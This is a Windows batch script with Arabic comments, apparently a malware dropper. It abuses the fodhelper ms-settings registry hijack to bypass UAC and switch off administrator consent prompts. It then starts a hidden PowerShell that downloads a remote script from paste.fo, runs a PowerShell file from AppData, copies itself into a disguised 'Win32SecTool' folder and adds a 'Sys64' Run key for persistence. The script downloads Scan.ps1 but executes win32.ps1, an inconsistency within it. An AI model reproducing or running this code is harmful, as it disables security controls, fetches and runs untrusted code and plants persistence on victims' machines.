@echo off
echo "EP, code started"
REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
fodhelper.exe
echo "UAC has been disabled"
setlocal enabledelayedexpansion
start /B PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://paste.fo/raw/ecf1d947094d?download','%APPDATA%\Scan.ps1')
@echo off
 set "appDataPath=%APPDATA%"
echo AppData path: !appDataPath!
start /B powershell.exe -ExecutionPolicy Bypass -File "!appDataPath!\win32.ps1" -noprofile -windowstyle hidden
rem احفظ اسم الملف الحالي
set "currentFileName=%~nx0"

rem احفظ مسار مجلد AppData
set "appDataFolder=%APPDATA%\Win32SecTool"

rem انشئ مسار الوجهة
set "destinationPath=!appDataFolder!"

rem انشئ المجلد في مجلد AppData
mkdir "!destinationPath!"

rem نسخ الملف إلى مجلد AppData
copy "%~f0" "!destinationPath!" /Y

rem تسجيل الملف في مفتاح التسجيل للبدء مع بدء التشغيل
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Sys64" /t REG_SZ /d "\"!destinationPath!\!currentFileName!\"" /f

endlocal
exit